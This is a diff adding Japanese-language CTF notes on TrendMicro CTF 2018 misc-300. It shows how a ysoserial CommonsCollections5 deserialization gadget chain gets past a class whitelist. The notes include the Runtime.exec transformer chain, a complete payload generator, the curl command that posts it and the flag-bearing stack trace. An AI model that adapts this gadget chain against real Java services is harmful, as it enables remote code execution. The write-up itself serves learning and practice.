@@ -744,12 +744,284 @@ OK
      24 ?        S      0:00          \_ sh
      25 ?        R      0:00              \_ ps ft
 ```
+## ysoserial commons collection5 / create custom payload (trendmicro-ctf-2018 misc-300)
+https://github.com/quangntenemy/CTF/blob/master/2018/trendmicro-ctf-2018/misc-300/README.md  
+https://graneed.hatenablog.com/entry/2018/09/16/132350  
+- **entrypoint**  
+warファイルが与えられて、これを`jd-gui`で読むと以下のソースが与えられる。  
+`Server.java`  
+`/jail`にPOSTでアクセスすると、`ObjectInputStream ois = new CustomOIS(is);`でカスタムに定義しているObjectInputStream型のインスタンスを作成して、`Person person = (Person)ois.readObject();`でそのインスタンスの`readObject`でデシリアライズして`Person`クラスにキャストして、それを`response.getWriter().append("Sorry " + person.name + ". I cannot let you have the Flag!.");`で出力に含める。  
+例外が発生したら`e.printStackTrace(response.getWriter());`でStackTrace上にエラーを出力する。  
+```java
+package com.trendmicro;
+
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.PrintWriter;
+import javax.servlet.ServletException;
+import javax.servlet.ServletInputStream;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+
+@WebServlet({"/jail"})
+public class Server
+  extends HttpServlet
+{
+  private static final long serialVersionUID = 1L;
+  
+  public Server() {}
+  
+  protected void doPost(HttpServletRequest request, HttpServletResponse response)
+    throws ServletException, IOException
+  {
+    try
+    {
+      ServletInputStream is = request.getInputStream();
+      ObjectInputStream ois = new CustomOIS(is);
+      Person person = (Person)ois.readObject();
+      ois.close();
+      response.getWriter().append("Sorry " + person.name + ". I cannot let you have the Flag!.");
+    } catch (Exception e) {
+      response.setStatus(500);
+      e.printStackTrace(response.getWriter());
+    }
+  }
+}
+```
+`CustomOIS.java`  
+`ObjectInputStream`を継承した`CustomOIS`クラスを定義して、`String[] whitelist`にデシリアライズを許可するクラスを定義している。  
+`public Class<?> resolveClass`で`ObjectStreamClass`の`resolveClass`メソッドをオーバーライドして、デシリアライズしようとしているクラスがホワイトリストにあるクラスじゃない場合、デシリアライズさせない。  
+```java
+package com.trendmicro;
+
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.ObjectStreamClass;
+import java.util.Arrays;
+import java.util.List;
+import javax.servlet.ServletInputStream;
+
+public class CustomOIS
+  extends ObjectInputStream
+{
+  private static final String[] whitelist = { "javax.management.BadAttributeValueExpException", 
+    "java.lang.Exception", 
+    "java.lang.Throwable", 
+    "[Ljava.lang.StackTraceElement;", 
+    "java.lang.StackTraceElement", 
+    "java.util.Collections$UnmodifiableList", 
+    "java.util.Collections$UnmodifiableCollection", 
+    "java.util.ArrayList", 
+    "org.apache.commons.collections.keyvalue.TiedMapEntry", 
+    "org.apache.commons.collections.map.LazyMap", 
+    "org.apache.commons.collections.functors.ChainedTransformer", 
+    "[Lorg.apache.commons.collections.Transformer;", 
+    "org.apache.commons.collections.functors.ConstantTransformer", 
+    "com.trendmicro.jail.Flag", 
+    "org.apache.commons.collections.functors.InvokerTransformer", 
+    "[Ljava.lang.Object;", 
+    "[Ljava.lang.Class;", 
+    "java.lang.String", 
+    "java.lang.Object", 
+    "java.lang.Integer", 
+    "java.lang.Number", 
+    "java.util.HashMap", 
+    "com.trendmicro.Person" };
+  
+  public CustomOIS(ServletInputStream is) throws IOException {
+    super(is);
+  }
+  // Modified input to ObjectStreamClass for testing locally
+  public Class<?> resolveClass(ObjectStreamClass des) throws IOException, ClassNotFoundException
+  {
+    if (!Arrays.asList(whitelist).contains(des.getName())) {
+      throw new ClassNotFoundException("Cannot deserialize " + des.getName());
+    }
+    return super.resolveClass(des);
+  }
+}
+```
+`Flag.java`  
+`Serializable`インターフェースを定義したFlagクラスの`getFlag()`メソッドを呼び出せば、例外をスローしながらFlagを出力してくれる。  
+```java
+package com.trendmicro.jail;
+
+import java.io.Serializable;
+
+public class Flag implements Serializable {
+  static final long serialVersionUID = 6119813099625710381L;
+  
+  public Flag() {}
+  
+  public static void getFlag() throws Exception { throw new Exception("<FLAG GOES HERE>"); }
+}
+```
+`Person.java`  
+本来はこっちをデシリアライズするつもりのやつ。  
+```java
+package com.trendmicro;
+
+import java.io.Serializable;
+
+public class Person implements Serializable {
+  public String name;
+  
+  public Person(String name) {
+    this.name = name;
+  }
+}
+```
+`CustomOIS.java`に`"org.apache.commons.collections.keyvalue.TiedMapEntry", `が含まれているのでcommons collectionsの脆弱性がありそう。  
+以下に記載されているExploitを使うと、`InvocationHandler`をシリアライズしているがこれはホワイトリストには登録されていないためデシリアライズできない。  
+https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/  
+https://qiita.com/yoshi389111/items/63c5b496ea308593bc92  
+ysoserialのcommons collection5なら代わりに`BadAttributeValueExpException`をシリアライズしていてこれはホワイトリストに入っているからOK  
+https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections5.java  
+RCEじゃなくてFlagクラスの`getFlag`メソッドを呼べればよいので、以下の部分を後者に変更する。  
+`ConstantTransformer`と`InvokerTransformer`の連続で`java.lang.Runtime.getRuntime().exec()`を呼び出すイメージ？  
+```java
+		final Transformer[] transformers = new Transformer[] {
+				new ConstantTransformer(Runtime.class),
+				new InvokerTransformer("getMethod", new Class[] {
+					String.class, Class[].class }, new Object[] {
+					"getRuntime", new Class[0] }),
+				new InvokerTransformer("invoke", new Class[] {
+					Object.class, Object[].class }, new Object[] {
+					null, new Object[0] }),
+				new InvokerTransformer("exec",
+					new Class[] { String.class }, execArgs),
+				new ConstantTransformer(1) };
+```
+以下は`Flag.getFlag()`のイメージ？  
+```java
+        final Transformer[] transformers = new Transformer[] { new ConstantTransformer(Flag.class),
+                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class },
+                        new Object[] { "getFlag", new Class[0] }),
+                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class },
+                        new Object[] { null, new Object[0] }),
+                new ConstantTransformer(1) };
+```
+最終的なExploitは以下。これを実行して、`Payload.ser`をPOSTするとerrorが発生してFlagゲットらしい。  
+```java
+package com.trendmicro;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+import javax.management.BadAttributeValueExpException;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+import com.trendmicro.jail.Flag;
+public class PayloadObjectGen {
+    public static void main(String args[]) throws Exception {
+        String path = "Payload.ser";
+        FileOutputStream fout = new FileOutputStream(path);
+        ObjectOutputStream oos = new ObjectOutputStream(fout);
+        oos.writeObject(getObject());
+        oos.close();
+        FileInputStream fis = new FileInputStream(path);
+        ObjectInputStream ois = new ObjectInputStream(fis);
+        String nameFromDisk = (String) ois.readObject();
+        System.out.println(nameFromDisk);
+        ois.close();
+    }
+    public static BadAttributeValueExpException getObject() throws Exception {
+        final Transformer transformerChain = new ChainedTransformer(new Transformer[] { new ConstantTransformer(1) });
+        final Transformer[] transformers = new Transformer[] { new ConstantTransformer(Flag.class),
+                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class },
+                        new Object[] { "getFlag", new Class[0] }),
+                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class },
+                        new Object[] { null, new Object[0] }),
+                new ConstantTransformer(1) };
+        final Map innerMap = new HashMap();
+        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
+        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
+        Field valfield = val.getClass().getDeclaredField("val");
+        valfield.setAccessible(true);
+        valfield.set(val, entry);
+        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
+        return val;
+    }
+}
+```
+```txt
+root@kali:~# curl "http://theflagmarshal.us-east-1.elasticbeanstalk.com/jail" --data-binary @Payload.ser 
+org.apache.commons.collections.FunctorException: InvokerTransformer: The method 'invoke' on 'class java.lang.reflect.Method' threw an exception
+    at org.apache.commons.collections.functors.InvokerTransformer.transform(InvokerTransformer.java:132)
+    at org.apache.commons.collections.functors.ChainedTransformer.transform(ChainedTransformer.java:122)
+    at org.apache.commons.collections.map.LazyMap.get(LazyMap.java:151)
+    at org.apache.commons.collections.keyvalue.TiedMapEntry.getValue(TiedMapEntry.java:73)
+    at org.apache.commons.collections.keyvalue.TiedMapEntry.toString(TiedMapEntry.java:131)
+    at javax.management.BadAttributeValueExpException.readObject(BadAttributeValueExpException.java:86)
+    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
+    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
+    at java.lang.reflect.Method.invoke(Method.java:498)
+    at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1170)
+    at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2177)
+    at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2068)
+    at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1572)
+    at java.io.ObjectInputStream.readObject(ObjectInputStream.java:430)
+    at com.trendmicro.Server.doPost(Server.java:31)
+    at javax.servlet.http.HttpServlet.service(HttpServlet.java:661)
+    at javax.servlet.http.HttpServlet.service(HttpServlet.java:742)
+    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
+    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+    at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
+    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:198)
+    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
+    at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:493)
+    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:140)
+    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:81)
+    at org.apache.catalina.valves.RemoteIpValve.invoke(RemoteIpValve.java:685)
+    at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:650)
+    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87)
+    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:342)
+    at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:800)
+    at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)
+    at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:800)
+    at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1471)
+    at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
+    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
+    at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+    at java.lang.Thread.run(Thread.java:748)
+Caused by: java.lang.reflect.InvocationTargetException
+    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
+    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
+    at java.lang.reflect.Method.invoke(Method.java:498)
+    at org.apache.commons.collections.functors.InvokerTransformer.transform(InvokerTransformer.java:125)
+    ... 40 more
+Caused by: java.lang.reflect.InvocationTargetException
+    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
+    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
+    at java.lang.reflect.Method.invoke(Method.java:498)
+    ... 45 more
+Caused by: java.lang.Exception: TMCTF{15nuck9astTheF1agMarsha12day}★★★
+    at com.trendmicro.jail.Flag.getFlag(Flag.java:10)
+    ... 49 more
+```
+- **payload**  
+
 ## 
 - **entrypoint**  
 - **payload**  
-## 
-- **entrypoint**  
-- **payload**  
+
+
 # DeserLab
 ## setup
 server側は以下でJARファイルを実行して9000ポートで待ち受け。   
